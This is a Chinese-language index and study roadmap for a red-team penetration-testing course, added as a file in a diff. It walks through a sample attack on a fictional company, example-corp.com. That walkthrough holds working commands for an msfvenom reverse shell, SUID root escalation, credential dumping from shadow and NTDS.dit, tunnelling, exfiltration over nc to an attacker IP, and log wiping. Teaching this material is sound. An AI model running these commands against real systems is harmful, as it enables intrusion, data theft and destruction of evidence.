@@ -1,0 +1,471 @@
+================================================================================
+        成长为一个红队 — 完整学习体系总目录
+================================================================================
+
+目录结构总览:
+
+成长为一个红队/
+├── 00-总目录与学习路线.txt              ← 【本文件】总览和导航
+├── ArchStrike新手安装教程.txt           ← 第一步 安装配置ArchStrike
+├── 红队队员成长训练计划.txt             ← 第二步 24周科学训练计划
+├── 补充-Python黑客脚本基础.txt          ← 必备编程技能
+├── 补充-进阶学习与缺失领域分析.txt       ← 缺口分析与进阶路线
+│
+├── archstrike-base教学/                 ← 基础渗透测试技术
+├── archstrike-recon教学/                ← 高级信息侦察
+├── archstrike-scanner教学/              ← 高级扫描技术
+├── archstrike-exploit教学/              ← 漏洞利用
+├── archstrike-web教学/                  ← Web应用安全
+├── archstrike-cracking教学/             ← 密码破解
+├── archstrike-privilege-escalation教学/ ← 权限提升
+├── archstrike-proxy教学/                ← 代理与隧道
+├── archstrike-wireless教学/             ← 无线安全
+├── archstrike-forensics教学/            ← 取证与反取证
+├── archstrike-fuzz教学/                 ← 模糊测试
+└── archstrike-malware教学/              ← 恶意软件分析
+
+================================================================================
+经典渗透案例：一次完整的企业红队行动路线
+================================================================================
+
+以下通过一个典型的APT式红队渗透案例，展示红队队员需要掌握的
+全部知识域，以及本教程体系中对应的教学模块。
+
+【场景设定】
+  目标: 某中型企业 (example-corp.com)
+  初始条件: 攻击队只有目标公司名称，零知识起点
+  任务: 获取域控制器(DC)的最高权限，窃取核心数据库
+
+┌──────────────────────────────────────────────────────────────────┐
+│ 阶段一: 信息侦察 (Reconnaissance)                                │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│ 操作1: OSINT信息收集                                             │
+│   → Firefox搜索 "Example Corp IT staff linkedin"                │
+│   → 收集员工姓名、职位、邮箱格式                                  │
+│   知识: 搜索引擎技巧 ═══════════════════► archstrike-recon/03    │
+│                                                                  │
+│ 操作2: 子域名与资产发现                                          │
+│   → amass enum -passive -d example-corp.com                     │
+│   → subfinder -d example-corp.com                               │
+│   → 发现: mail.example-corp.com, vpn.example-corp.com,           │
+│           dev.example-corp.com, jenkins.internal.example-corp.com│
+│   知识: 子域名枚举 ═════════════════════► archstrike-recon/01    │
+│                                                                  │
+│ 操作3: DNS深度侦察                                               │
+│   → fierce --domain example-corp.com                            │
+│   → dnsenum example-corp.com                                    │
+│   → 发现内部DNS服务器, 潜在的域控制器                            │
+│   知识: DNS侦察 ═══════════════════════► archstrike-recon/02    │
+│                                                                  │
+│ 操作4: 搜索引擎Dorking                                           │
+│   → site:example-corp.com filetype:pdf "confidential"           │
+│   → site:example-corp.com filetype:sql "password"               │
+│   → Shodan搜索: org:"Example Corp"                              │
+│   知识: Google Dorking ═══════════════► archstrike-recon/03     │
+│                                                                  │
+│ 用到本教程模块: archstrike-recon/01, 02, 03                      │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+                              ↓
+┌──────────────────────────────────────────────────────────────────┐
+│ 阶段二: 扫描与枚举 (Scanning & Enumeration)                      │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│ 操作5: 大规模快速端口扫描                                        │
+│   → masscan -p1-65535 203.0.113.0/24 --rate=10000               │
+│   → 发现开放端口: 22(SSH), 80(HTTP), 443(HTTPS), 8080(Jenkins)  │
+│   知识: 高速扫描 ═══════════════════════► archstrike-scanner/01  │
+│                                                                  │
+│ 操作6: 详细服务扫描                                              │
+│   → nmap -sS -sV -sC -O -p22,80,443,8080 203.0.113.10           │
+│   → Web服务器: Apache 2.4.49 (已知有路径穿越漏洞!)               │
+│   → Jenkins: 8080端口, 版本2.319                                 │
+│   知识: nmap深度扫描 ═════════════════════► archstrike-base/03   │
+│                                                                  │
+│ 操作7: Banner抓取确认                                            │
+│   → amap -bqv 203.0.113.10 80 443 8080                          │
+│   知识: 服务识别 ═══════════════════════► archstrike-scanner/02  │
+│                                                                  │
+│ 用到本教程模块: archstrike-scanner/01, 02; archstrike-base/03    │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+                              ↓
+┌──────────────────────────────────────────────────────────────────┐
+│ 阶段三: 漏洞分析与利用 (Vulnerability Analysis & Exploitation)    │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│ 操作8: 搜索已有漏洞利用                                          │
+│   → searchsploit apache 2.4.49                                  │
+│   → 找到: Apache 2.4.49 - Path Traversal & RCE                  │
+│   → searchsploit -m multiple/webapps/50383.py                   │
+│   知识: exploit-db ═══════════════════════► archstrike-exploit/02│
+│                                                                  │
+│ 操作9: Web应用扫描                                               │
+│   → whatweb http://example-corp.com                             │
+│   → nikto -h http://example-corp.com                            │
+│   → dirb http://example-corp.com /usr/share/dirb/wordlists/     │
+│   知识: Web扫描 ═════════════════════════► archstrike-web/02, 03 │
+│                                                                  │
+│ 操作10: 利用Apache RCE获取初始Shell                              │
+│   → 使用msfvenom生成payload:                                     │
+│     msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 \    │
+│              LPORT=4444 -f elf -o shell.elf                     │
+│   → 通过路径穿越上传shell.elf                                    │
+│   → nc -lvp 4444 接收连接                                       │
+│   → 获得 www-data 用户权限                                       │
+│   知识: msfvenom/漏洞利用 ═══════════════► archstrike-exploit/01 │
+│   知识: 基础监听 ═════════════════════════► archstrike-base/03   │
+│                                                                  │
+│ 用到本教程模块: archstrike-exploit/01, 02;                       │
+│               archstrike-web/02, 03; archstrike-base/03         │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+                              ↓
+┌──────────────────────────────────────────────────────────────────┐
+│ 阶段四: 权限提升 (Privilege Escalation)                          │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│ 操作11: 系统信息收集                                             │
+│   → whoami; id; uname -a; cat /etc/os-release                   │
+│   → 上传linpeas.sh: ./linpeas.sh | tee peas.txt                 │
+│   → 发现: /usr/bin/find 有SUID位!                                │
+│   知识: Linux信息收集 ═════════════════► archstrike-priv-esc/01  │
+│                                                                  │
+│ 操作12: SUID提权                                                 │
+│   → find / -perm -4000 -type f 2>/dev/null | grep -v snap       │
+│   → /usr/bin/find . -exec /bin/sh -p \; -quit                   │
+│   → whoami → root !                                             │
+│   知识: SUID提权 ═══════════════════════► archstrike-priv-esc/01 │
+│                                                                  │
+│ 操作13: 验证并持久化                                             │
+│   → cat /etc/shadow | grep root                                 │
+│   → 添加SSH密钥到 /root/.ssh/authorized_keys                    │
+│   知识: 提权综合实战 ═══════════════════► archstrike-priv-esc/03 │
+│                                                                  │
+│ 用到本教程模块: archstrike-privilege-escalation/01, 03           │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+                              ↓
+┌──────────────────────────────────────────────────────────────────┐
+│ 阶段五: 后渗透与横向移动 (Post-Exploitation & Lateral Movement)   │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│ 操作14: 凭证收集                                                │
+│   → 转储/etc/shadow: cat /etc/shadow                            │
+│   → 破解hash: john --wordlist=rockyou.txt shadow.hash            │
+│   → 发现多个用户密码                                             │
+│   知识: 离线密码破解 ═══════════════════► archstrike-cracking/02  │
+│                                                                  │
+│ 操作15: 发现内网拓扑                                             │
+│   → ip a; route -n; arp -a                                      │
+│   → 发现内网: 10.0.1.0/24, 10.0.2.0/24                         │
+│   → 扫描内网存活: for i in {1..254}; do (ping -c1 10.0.1.$i) & done│
+│   知识: 后渗透侦察 ═══════════════════════► archstrike-base/07   │
+│                                                                  │
+│ 操作16: 建立内网代理隧道                                         │
+│   → 攻击机: chisel server -p 8000 --reverse                     │
+│   → 跳板机: chisel client 10.0.0.1:8000 R:1080:socks           │
+│   → 配置proxychains: socks5 127.0.0.1 1080                      │
+│   → proxychains nmap -sT -Pn 10.0.1.0/24 (扫描内网!)            │
+│   知识: 代理隧道 ═════════════════════════► archstrike-proxy/02   │
+│                                                                  │
+│ 操作17: 横向移动到域控制器                                       │
+│   → 发现DC: 10.0.1.10 (通过扫描389/636 LDAP端口)                │
+│   → proxychains crackmapexec smb 10.0.1.10 -u admin -p 'Pass123'│
+│   → 使用psexec获得SYSTEM权限                                     │
+│   → 导出NTDS.dit: secretsdump.py domain/admin:Pass123@10.0.1.10 │
+│   知识: 后渗透 ═══════════════════════════► archstrike-base/07   │
+│   知识: 凭证破解 ═════════════════════════► archstrike-cracking/01│
+│                                                                  │
+│ 用在教程模块: archstrike-cracking/01,02; archstrike-proxy/02;   │
+│              archstrike-base/07                                  │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+                              ↓
+┌──────────────────────────────────────────────────────────────────┐
+│ 阶段六: 数据提取与痕迹清除 (Exfiltration & Covering Tracks)      │
+├──────────────────────────────────────────────────────────────────┤
+│                                                                  │
+│ 操作18: 目标数据定位和提取                                       │
+│   → find / -name "*.xlsx" -o -name "*.docx" -o -name "*.sql"    │
+│   → tar加密传输: tar czf - sensitive_files/ | openssl enc \     │
+│     -aes-256-cbc -pass pass:key | nc 10.0.0.1 5555              │
+│   知识: 数据提取 ══════════════════════════ archstrike-base/07   │
+│                                                                  │
+│ 操作19: 痕迹清除                                                 │
+│   → 清除bash历史: echo > ~/.bash_history                        │
+│   → 清除auth日志: shred -z /var/log/auth.log                    │
+│   → 清除上传的工具                                                │
+│   → 修改文件时间戳: touch -t 202301011200 /var/log/auth.log     │
+│   知识: 痕迹清除 ═══════════════════════► archstrike-base/08     │
+│   知识: 反取证 ═══════════════════════► archstrike-forensics/01  │
+│                                                                  │
+│ 操作20: 编写渗透报告                                             │
+│   → 记录完整攻击链                                               │
+│   → 漏洞描述和修复建议                                           │
+│   → CVSS评分                                                     │
+│   知识: 报告写作 ═══════════════════════► archstrike-base/08     │
+│                                                                  │
+│ 用到本教程模块: archstrike-base/07, 08; archstrike-forensics/01  │
+│                                                                  │
+└──────────────────────────────────────────────────────────────────┘
+
+【总结】这次红队行动用到的知识域:
+
+  ▲ 信息侦察   → recon/01,02,03
+  ▲ 扫描枚举   → scanner/01,02  +  base/03
+  ▲ Web攻击    → web/02,03
+  ▲ 漏洞利用   → exploit/01,02  +  base/03
+  ▲ 权限提升   → priv-esc/01,03
+  ▲ 密码破解   → cracking/01,02
+  ▲ 代理隧道   → proxy/02
+  ▲ 后渗透     → base/07
+  ▲ 痕迹清除   → base/08  +  forensics/01
+  ▲ 编程基础   → Python补充
+
+  以上能力 = 一个合格红队队员的完整技能栈!
+
+================================================================================
+完整科学化学习顺序 (按优先级排列)
+================================================================================
+
+根据上述渗透案例展示的知识依赖关系，以下是最优学习顺序:
+
+【第一层：基石 — 没有这些无法进行任何操作】
+─────────────────────────────────────
+  ★ 优先级1: 基础环境与命令
+    → ArchStrike新手安装教程.txt
+    → archstrike-base/01-基础命令与Linux安全操作.txt
+    → 补充-Python黑客脚本基础.txt
+
+【第二层：侦察 — 渗透测试的第一步永远是信息收集】
+─────────────────────────────────────
+  ★ 优先级2: 信息收集与侦察
+    → archstrike-base/02-信息收集与侦察技术.txt (入门)
+    → archstrike-recon/01-高级子域名与资产发现.txt
+    → archstrike-recon/02-高级DNS侦察技术.txt
+    → archstrike-recon/03-OSINT与人肉搜索技术.txt
+
+【第三层：扫描 — 识别攻击面】
+─────────────────────────────────────
+  ★ 优先级3: 网络与Web扫描
+    → archstrike-base/03-网络扫描与枚举技术.txt
+    → archstrike-scanner/01-高速大规模扫描技术.txt
+    → archstrike-scanner/02-服务识别与Banner抓取.txt
+    → archstrike-web/01-Web基础与HTTP协议.txt
+    → archstrike-web/02-Web信息收集与侦察.txt
+    → archstrike-web/03-Web漏洞扫描与检测.txt
+
+【第四层：攻击 — 核心渗透技能】
+─────────────────────────────────────
+  ★ 优先级4: 漏洞利用
+    → archstrike-base/04-漏洞评估与利用基础.txt
+    → archstrike-exploit/01-漏洞利用框架精通.txt
+    → archstrike-exploit/02-Exploit-DB与SearchSploit使用.txt
+    → archstrike-exploit/03-路由器与IoT漏洞利用.txt
+
+【第五层：Web深度攻击】
+─────────────────────────────────────
+  ★ 优先级5: Web应用安全
+    → archstrike-web/04-SQL注入攻击.txt
+    → archstrike-web/05-XSS与CSRF攻击.txt
+    → archstrike-web/06-文件包含与命令注入.txt
+    → archstrike-web/07-认证与会话攻击.txt
+    → archstrike-web/08-Web渗透综合实战.txt
+    → archstrike-web/09-WAF绕过与高级技巧.txt
+
+【第六层：凭据攻击】
+─────────────────────────────────────
+  ★ 优先级6: 密码攻击与破解
+    → archstrike-base/05-密码攻击与破解技术.txt
+    → archstrike-cracking/01-在线密码攻击大师课.txt
+    → archstrike-cracking/02-离线密码破解大师课.txt
+    → archstrike-cracking/03-字典生成与密码分析.txt
+
+【第七层：网络攻击高级技术】
+─────────────────────────────────────
+  ★ 优先级7: 嗅探与中间人
+    → archstrike-base/06-网络嗅探与中间人攻击.txt
+    → archstrike-exploit/04-社会工程学攻击(SET).txt
+
+【第八层：后渗透 — 进入内网后的关键能力】
+─────────────────────────────────────
+  ★ 优先级8: 提权与横向移动
+    → archstrike-privilege-escalation/01-Linux权限提升完整指南.txt
+    → archstrike-privilege-escalation/02-Windows权限提升技术.txt
+    → archstrike-privilege-escalation/03-提权综合工具链实战.txt
+    → archstrike-proxy/01-代理与隐蔽通信.txt
+    → archstrike-proxy/02-内网隧道与端口转发.txt
+    → archstrike-base/07-后渗透与权限维持.txt
+
+【第九层：无线安全】
+─────────────────────────────────────
+  ★ 优先级9: 无线网络攻击
+    → archstrike-wireless/01-无线网络基础.txt
+    → archstrike-wireless/02-无线侦察与扫描.txt
+    → archstrike-wireless/03-WEP破解.txt
+    → archstrike-wireless/04-WPA-WPA2破解.txt
+    → archstrike-wireless/05-WPS攻击.txt
+    → archstrike-wireless/06-企业无线攻击与Rogue AP.txt
+    → archstrike-wireless/07-无线安全综合实战.txt
+
+【第十层：进阶能力 — 从红队到专家】
+─────────────────────────────────────
+  ★ 优先级10: 取证/反取证、Fuzzing、恶意软件分析
+    → archstrike-base/08-痕迹清除与渗透报告.txt
+    → archstrike-forensics/01-磁盘取证与反取证.txt
+    → archstrike-forensics/02-内存取证与攻击痕迹.txt
+    → archstrike-forensics/03-数据恢复与反删除技术.txt
+    → archstrike-fuzz/01-模糊测试入门与AFL实战.txt
+    → archstrike-fuzz/02-协议与Web模糊测试.txt
+    → archstrike-malware/01-恶意软件分析入门.txt
+    → archstrike-malware/02-YARA规则编写与检测.txt
+
+================================================================================
+24周/6个月学习时间线 (日常3小时)
+================================================================================
+
+  第1周   安装环境 → 安装教程 + base/01
+  第2周   基础技能 → Python补充 + base/01 完成
+  第3周   侦察入门 → base/02 + recon/01
+  第4周   高级侦察 → recon/01, 02, 03
+  ──────────────────────────── (第一阶段完成)
+  第5周   扫描入门 → base/03
+  第6周   高级扫描 → scanner/01, 02
+  第7周   Web基础 → web/01, 02
+  第8周   Web扫描 → web/03
+  ──────────────────────────── (第二阶段完成)
+  第9周   漏洞利用 → base/04
+  第10周  高级利用 → exploit/01, 02
+  第11周  IoT利用  → exploit/03
+  第12周  复习综合 → HTB/TryHackMe实战
+  ──────────────────────────── (第三阶段完成)
+  第13周  SQL注入  → web/04
+  第14周  XSS/CSRF → web/05
+  第15周  文件包含 → web/06
+  第16周  认证攻击 → web/07
+  ──────────────────────────── (第四阶段完成)
+  第17周  Web综合 → web/08
+  第18周  WAF绕过 → web/09
+  第19周  密码攻击 → base/05 + cracking/01
+  第20周  密码破解 → cracking/02, 03
+  ──────────────────────────── (第五阶段完成)
+  第21周  嗅探MITM → base/06 + exploit/04
+  第22周  Linux提权→ priv-esc/01, 02
+  第23周  提权实战 → priv-esc/03 + proxy/01, 02
+  第24周  后渗透  → base/07, 08
+  ──────────────────────────── (核心阶段完成)
+  进阶   无线安全 → wireless/* (7个模块)
+  进阶   取证Fuzz → forensics/* + fuzz/* + malware/*
+
+================================================================================
+各文件夹内容详细说明
+================================================================================
+
+【archstrike-base教学/】基础渗透测试核心技能 (8文件, 4418行)
+  01-基础命令与Linux安全操作.txt — Linux基础+SSH加固
+  02-信息收集与侦察技术.txt — OSINT入门侦察
+  03-网络扫描与枚举技术.txt — nmap/netcat完整教程
+  04-漏洞评估与利用基础.txt — Metasploit框架入门
+  05-密码攻击与破解技术.txt — hydra/john/hashcat入门
+  06-网络嗅探与中间人攻击.txt — Wireshark/bettercap
+  07-后渗透与权限维持.txt — Meterpreter/持久化
+  08-痕迹清除与渗透报告.txt — 清除痕迹+报告模板
+
+【archstrike-recon教学/】高级信息侦察 (3文件, 1754行)
+  01-高级子域名与资产发现.txt — amass/subfinder/assetfinder
+  02-高级DNS侦察技术.txt — fierce/dnsenum/AXFR
+  03-OSINT与人肉搜索技术.txt — Google Dork/Shodan/Maltego
+
+【archstrike-scanner教学/】高级扫描技术 (2文件, 1507行)
+  01-高速大规模扫描技术.txt — masscan/zmap
+  02-服务识别与Banner抓取.txt — amap/unicornscan
+
+【archstrike-exploit教学/】漏洞利用 (4文件, 2774行)
+  01-漏洞利用框架精通.txt — msfvenom/Meterpreter高级
+  02-Exploit-DB与SearchSploit使用.txt — 漏洞搜索和利用
+  03-路由器与IoT漏洞利用.txt — routersploit
+  04-社会工程学攻击(SET).txt — SEToolkit/钓鱼
+
+【archstrike-web教学/】Web应用安全 (9文件, 6103行)
+  01-Web基础与HTTP协议.txt — HTTP+Firefox开发者工具
+  02-Web信息收集与侦察.txt — whatweb/wpscan/dirb
+  03-Web漏洞扫描与检测.txt — nikto/ZAP/arachni
+  04-SQL注入攻击.txt — sqlmap完整教程
+  05-XSS与CSRF攻击.txt — beef/xsser/xsstrike
+  06-文件包含与命令注入.txt — commix/LFI/RFI
+  07-认证与会话攻击.txt — Burp爆破/Session
+  08-Web渗透综合实战.txt — 完整渗透流程
+  09-WAF绕过与高级技巧.txt — tamper/绕过技术
+
+【archstrike-cracking教学/】密码破解 (3文件, 2843行)
+  01-在线密码攻击大师课.txt — hydra/medusa/crowbar
+  02-离线密码破解大师课.txt — hashcat GPU/John高级
+  03-字典生成与密码分析.txt — crunch/cupp/cewl/mentalist
+
+【archstrike-privilege-escalation教学/】权限提升 (3文件, 2021行)
+  01-Linux权限提升完整指南.txt — linPEAS/SUID/kernel
+  02-Windows权限提升技术.txt — winPEAS/PowerUp
+  03-提权综合工具链实战.txt — 完整提权方法
+
+【archstrike-proxy教学/】代理与隧道 (2文件, 1084行)
+  01-代理与隐蔽通信.txt — proxychains/Tor
+  02-内网隧道与端口转发.txt — chisel/SSH/3proxy
+
+【archstrike-wireless教学/】无线安全 (7文件, 4690行)
+  01-无线网络基础.txt — 802.11原理/网卡配置
+  02-无线侦察与扫描.txt — kismet/airodump-ng
+  03-WEP破解.txt — WEP完整破解
+  04-WPA-WPA2破解.txt — WPA2握手/PMKID
+  05-WPS攻击.txt — reaver/bully/pixiewps
+  06-企业无线攻击与Rogue AP.txt — hostapd-wpe/wifiphisher
+  07-无线安全综合实战.txt — 完整无线渗透
+
+【archstrike-forensics教学/】取证与反取证 (3文件, 2147行)
+  01-磁盘取证与反取证.txt — sleuthkit/autopsy
+  02-内存取证与攻击痕迹.txt — volatility
+  03-数据恢复与反删除技术.txt — foremost/testdisk
+
+【archstrike-fuzz教学/】模糊测试 (2文件, 1320行)
+  01-模糊测试入门与AFL实战.txt — AFL全覆盖
+  02-协议与Web模糊测试.txt — bed/zzuf/fuff
+
+【archstrike-malware教学/】恶意软件分析 (2文件, 1803行)
+  01-恶意软件分析入门.txt — 静态/动态分析
+  02-YARA规则编写与检测.txt — YARA完整教程
+
+【补充文件】
+  ArchStrike新手安装教程.txt — 275行
+  红队队员成长训练计划.txt — 3489行
+  补充-Python黑客脚本基础.txt — Python安全脚本
+  补充-进阶学习与缺失领域分析.txt — 缺口分析+进阶路线
+  00-总目录与学习路线.txt — 本文件
+
+================================================================================
+完整文件统计
+================================================================================
+总文件夹: 12个教学文件夹 + 5个根文件
+总文件数: 57个TXT文件
+总行数:   约35,000+行
+总字数:   约70万+字
+
+================================================================================
+学习建议
+================================================================================
+1. 严格按优先级顺序学习, 每层学透再进入下一层
+2. 每天固定3小时, 理论1h + 实践1.5h + 复盘0.5h
+3. 每个模块完成后在靶场验证所学技能
+4. 同步在HackTheBox/TryHackMe上闯关
+5. 每周Review Day回顾, 每月做一次综合实战
+6. 身体是革命本钱: 坚持体能训练+科学饮食
+7. 从安装到全部学完预计6-12个月, 保持耐心
+
+================================================================================
+法律声明
+================================================================================
+本教程所有内容仅供安全研究和授权测试使用。
+严禁在未获授权的系统上进行任何渗透测试活动。
+使用者须遵守当地法律法规, 自行承担所有责任。
+
+================================================================================
